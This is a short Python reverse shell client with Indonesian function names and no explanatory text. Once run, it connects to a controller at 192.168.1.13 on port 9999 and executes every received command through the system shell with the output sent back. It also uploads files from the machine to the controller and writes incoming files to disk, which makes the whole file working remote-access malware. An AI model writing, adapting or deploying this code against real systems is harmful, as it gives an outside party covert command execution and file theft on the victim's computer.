import socket
import subprocess
from subprocess import PIPE
import json
import os

sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sc.connect(("192.168.1.13", 9999))


def menerima_perintah():
    data = ""
    while True:
        try:
            data = data + sc.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(namaFile):
    file = open(namaFile, "rb")
    sc.send(file.read())
    file.close()

def download_file(namaFile):
    file = open(namaFile, "wb")
    sc.settimeout(1)
    _file = sc.recv(1024)
    while _file:
        file.write(_file)
        try:
            _file = sc.recv(1024)
        except socket.timeout as e:
            break
    sc.settimeout(None)
    file.close()



def jalankan_perintah():
    while True:
        perintah = menerima_perintah()
        if perintah in ("exit", "quit"):
            break
        elif perintah == "clear":
            pass
        elif perintah[:3] == "cd ":
            os.chdir(perintah[3:])
        elif perintah[:8] == "download":
            upload_file(perintah[9:])
        elif perintah[:6] == "upload":
            download_file(perintah[7:])
        else:
            execute = subprocess.Popen(
                perintah,
                shell=True,
                stdout=PIPE,
                stderr=PIPE,
                stdin=PIPE,
            )
            data = execute.stdout.read() + execute.stderr.read()
            data = data.decode()
            output = json.dumps(data)
            sc.send(output.encode())
        
jalankan_perintah()